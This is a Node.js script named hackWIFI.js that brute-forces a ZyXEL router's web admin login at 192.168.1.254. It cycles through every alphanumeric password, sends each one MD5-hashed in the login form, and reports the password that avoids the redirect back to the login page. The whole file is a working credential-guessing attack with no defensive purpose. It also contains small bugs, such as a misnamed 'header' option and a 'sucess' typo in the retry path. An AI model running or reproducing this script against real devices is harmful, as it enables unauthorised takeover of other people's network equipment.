// Usage: $ node hackWIFI.js

var request = require('request')
var md5     = require('md5')

var allowed_chars = []
var found = false

// from 48 to 57, then 65 to 90, then 97 to 122

for (var i = 48; i <= 122; ++i) {
    if (i == 58)
        i = 65
    else if (i == 91)
        i = 97

    allowed_chars.push(String.fromCharCode(i))
}

var req = function(pwd) {
    return new Promise(function(resolve, reject) {
        request.post({
                url:'http://192.168.1.254/Forms/rpAuth_1',
                header: {
                    'Host': '192.168.1.254',
                    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'http://192.168.1.254/',
                    'Connection': 'keep-alive'
                },
                timeout: 1000,
                form: {
                        'LoginPassword': 'ZyXEL+ZyWALL+Series',
                        'hiddenPassword':  md5(pwd),
                        'Prestige_Login': 'Login'
                }
            },
            function(err,httpResponse,body) {
                console.log("yup")
                try {
                    if (err || (httpResponse.statusCode === 303 && httpResponse.headers['location'] === 'http://192.168.1.254/rpAuth.html')) {
                        console.log("FUCK")
                        reject();
                    }
                    else
                        resolve(httpResponse)
                }
                catch(e) {
                    console.log("Retrying")
                    req(pwd).then(function(success) {
                        resolve(sucess)
                    }).catch(function() {
                        reject()
                    })
                }
            }
        )
    })
}

function foundIt(pwd, response) {
    found = true
    console.log(pwd + " is the right one!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
}

var passwordAsArray = [0]

function test () {
    while(!found) {
        var pwd = passwordAsArray.map(function(number) {
            return allowed_chars[number]
        }).reverse().join('')

        var i = 0
        while(true) {    
            if (passwordAsArray[i] != null) {
                passwordAsArray[i] = (passwordAsArray[i]+1) % allowed_chars.length
                if (passwordAsArray[i] !== 0) break
                else i++
            }
            else {
                passwordAsArray[i] = 0
                break
            }
        }

        console.log("Currently testing..."+pwd)
        // var now = Date.now()
        // while (Date.now() - 300 < now) {}
        var promise = req(pwd).then(foundIt.bind(null,pwd))
        if (passwordAsArray[0] % 2 === 0) {
            promise.catch(test)
            break
        }
    }
}
test()